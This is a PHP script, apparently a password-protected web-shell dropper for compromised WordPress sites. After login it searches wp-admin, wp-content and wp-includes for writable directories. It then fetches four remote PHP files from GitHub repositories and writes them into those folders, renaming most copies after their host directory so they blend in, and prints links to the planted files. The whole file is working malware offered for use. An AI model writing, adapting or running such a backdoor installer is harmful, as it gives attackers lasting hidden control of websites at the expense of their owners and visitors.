<?php
session_start();
if(isset($_POST['p'])&&md5($_POST['p'])==='d2ac32e14d651b9ed03f26f845a11597')$_SESSION['l']=1;
if(isset($_GET['o']))unset($_SESSION['l']);
if(empty($_SESSION['l'])){echo '<form method="post"><input type="password" name="p"><input type="submit" value="Go"></form>';exit;}
$urls = [
    'https://github.com/A3rr0rM/aa/raw/refs/heads/main/wp-admin.php',
    'https://github.com/A3rr0rM/aa/raw/refs/heads/main/wp-info.php',
    'https://github.com/Mr-X1337/xxx/raw/refs/heads/main/jk.php',
    'https://github.com/A3rr0rM/aa/raw/refs/heads/main/xmv2.php'
];

function g($d,$l=0,&$r=[],$m=7){
    if($l>$m||!is_readable($d)||!($f=@scandir($d)))return;
    foreach($f as $i){
        if($i==='.'||$i==='..')continue;
        $p=rtrim($d,'/\\').'/'.$i;
        if(is_dir($p)){if(is_writable($p))$r[]=[$p,$l+1];g($p,$l+1,$r,$m);}
    }
}

$rt=rtrim($_SERVER['DOCUMENT_ROOT'],'/\\');
$wA=$rt.'/wp-admin';
$pd=[$wA,$rt.'/wp-content',$rt.'/wp-includes'];
$sp=[];$wD=null;$all=[];

foreach($pd as $d){
    if(is_dir($d)&&is_readable($d)){
        $t=[];if(is_writable($d))$t[]=[$d,0];
        g($d,0,$t);
        foreach($t as $x)$all[]=$x;
    }
}

if(!$all){
    $t=[];if(is_writable($rt))$t[]=[$rt,0];
    g($rt,0,$t);
    $all=$t;
}

if($all){
    usort($all,function($a,$b){return $b[1]<=>$a[1];});
    foreach($all as $v)if(!in_array($v[0],$sp))$sp[]=$v[0];
}

foreach($sp as $p)if(strpos($p,$wA)===0){$wD=$p;break;}
if(!$sp)$sp=is_writable($rt)?[$rt]:[sys_get_temp_dir()];

$df=[];$ap=$sp;
foreach($urls as $i=>$u){
    if(($c=@file_get_contents($u))!==false){
        $ext=pathinfo(parse_url($u,PHP_URL_PATH),PATHINFO_EXTENSION);
        if(!$ext)$ext='php';
        
        $sv='';
        if($i===0&&$wD!==null){
            $sv=$wD;
            if(($k=array_search($wD,$ap))!==false)unset($ap[$k]);
        }else{
            if(!$ap)$ap=$sp;
            $k=array_rand($ap);$sv=$ap[$k];unset($ap[$k]);
        }
        
        if($i===0){
            $fn=basename(parse_url($u,PHP_URL_PATH));
            if(!$fn)$fn='index.'.$ext;
        }else{
            $dn=preg_replace('/[^a-zA-Z0-9_\-]/','',basename(rtrim($sv,'/\\')));
            if(!$dn)$dn='index';
            $fn=$dn.'.'.$ext;
        }
        
        $lp=rtrim($sv,'/\\').'/'.$fn;
        if(file_put_contents($lp,$c)!==false)$df[]=[$lp,$u];
    }
}

if($df){
    echo"<h2>Downloaded Files:</h2>";
    foreach($df as $d){
        $url=str_replace('\\','/',str_replace($rt,'',$d[0]));
        if(strpos($url,'/')!==0)$url='/'.$url;
        echo"<p>File: <a href='$url'>$url</a><br>URL: {$d[1]}</p>";
    }
}else{
    echo"No files downloaded.";
}
?>
